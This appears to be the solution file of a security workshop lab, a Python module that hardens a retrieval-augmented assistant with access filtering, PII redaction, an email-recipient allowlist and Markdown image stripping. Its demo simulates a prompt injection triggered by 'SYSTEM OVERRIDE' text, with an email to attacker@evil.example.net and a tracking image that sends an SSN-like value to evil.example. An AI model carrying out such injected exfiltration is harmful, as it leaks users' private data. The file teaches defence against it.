"""Lab 5 Solution: Hardened RAG + Tool Assistant."""

from __future__ import annotations

import re
from functools import lru_cache

from lab5_attack_and_harden.vulnerable_app import EMAIL_OUTBOX, VECTOR_DB

ALLOWED_EMAIL_DOMAINS = ("acme.example.com",)
# Exactly one address, no separators: "attacker@evil.example.net, bob@acme.example.com" must not pass.
SINGLE_EMAIL = re.compile(r"[a-z0-9._%+-]+@([a-z0-9-]+(?:\.[a-z0-9-]+)+)")
# Markdown image with an absolute or protocol-relative URL, any letter case (HTTPS://, //host/...).
EXTERNAL_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(?:[a-z][a-z0-9+.-]*:)?//[^)]*\)", re.IGNORECASE)
SPACY_MODEL = "en_core_web_sm"


@lru_cache(maxsize=1)
def _presidio_engines():
    """Build Presidio engines once per process.

    Loading the spaCy model takes seconds, so never create AnalyzerEngine() per request.
    The model is pinned explicitly: Presidio's default config wants `en_core_web_lg`
    and silently downloads it (~400 MB) when missing.
    """
    import spacy
    from presidio_analyzer import AnalyzerEngine
    from presidio_analyzer.nlp_engine import NlpEngineProvider
    from presidio_anonymizer import AnonymizerEngine

    if not spacy.util.is_package(SPACY_MODEL):
        raise RuntimeError(f"spaCy model '{SPACY_MODEL}' is missing. Run: python -m spacy download {SPACY_MODEL}")

    nlp_engine = NlpEngineProvider(
        nlp_configuration={
            "nlp_engine_name": "spacy",
            "models": [{"lang_code": "en", "model_name": SPACY_MODEL}],
        }
    ).create_engine()
    return AnalyzerEngine(nlp_engine=nlp_engine, supported_languages=["en"]), AnonymizerEngine()


def retrieve_docs(query: str, user_access_level: str) -> list[dict]:
    """Enforce document-level ACLs in the retrieval layer before prompt assembly."""
    allowed_levels = {"public"}
    if user_access_level == "hr_confidential":
        allowed_levels.add("hr_confidential")
    return [d for d in VECTOR_DB if d["access_level"] in allowed_levels]


def redact_pii(text: str) -> str:
    """Redact PII using Microsoft Presidio before text reaches an external LLM API or logs."""
    analyzer, anonymizer = _presidio_engines()
    results = analyzer.analyze(
        text=text,
        entities=["EMAIL_ADDRESS", "PHONE_NUMBER", "US_SSN", "PERSON"],
        language="en",
    )
    return anonymizer.anonymize(text=text, analyzer_results=results).text


def send_email_tool(to: str, body: str, caller_role: str) -> str:
    """Deterministic authorization & recipient domain allowlist outside the LLM."""
    if caller_role not in {"admin", "support_lead"}:
        raise PermissionError(f"Role '{caller_role}' is not authorized to send emails.")
    match = SINGLE_EMAIL.fullmatch(to.strip().lower())
    if not match or match.group(1) not in ALLOWED_EMAIL_DOMAINS:
        raise ValueError(f"Blocked email recipient: {to!r} (one address in {ALLOWED_EMAIL_DOMAINS} required)")

    EMAIL_OUTBOX.append({"to": to, "body": body})
    return f"Email sent to {to}"


def sanitize_markdown(output: str) -> str:
    """Strip external Markdown image tags to prevent zero-click exfiltration.

    A regex is a workshop-sized defense. In production, render Markdown with a parser
    and an image-host allowlist, and back it with a CSP (`img-src 'self'`) in the client.
    """
    return EXTERNAL_MD_IMAGE.sub("[external image removed]", output)


def hardened_llm_step(user_query: str, user_access_level: str, caller_role: str) -> str:
    docs = retrieve_docs(user_query, user_access_level=user_access_level)
    context = "\n".join(d["text"] for d in docs)

    # Everything that leaves the process (LLM API, logs) is redacted first.
    clean_query = redact_pii(user_query)
    clean_context = redact_pii(context)
    print(f"[Prompt sent to LLM] query={clean_query!r}")

    if "SYSTEM OVERRIDE" in clean_context:
        try:
            send_email_tool(to="attacker@evil.example.net", body=f"Leaked: {clean_context[:120]}", caller_role=caller_role)
        except (PermissionError, ValueError) as exc:
            print(f"[Blocked tool call] {exc}")

        raw_output = (
            "Here is the Vendor Onboarding Guide. "
            "![track](https://evil.example/collect?data=219-09-9999)"
        )
        return sanitize_markdown(raw_output)

    return sanitize_markdown(f"Based on retrieved docs: {clean_context[:120]}")


if __name__ == "__main__":
    print("=== Running Hardened Assistant Demo ===")
    resp = hardened_llm_step(
        user_query="Hi, my email is alice@acme.example.com, can you share the vendor guide?",
        user_access_level="public",
        caller_role="intern",
    )
    print("Response:", resp)
    print("Outbox:", EMAIL_OUTBOX)
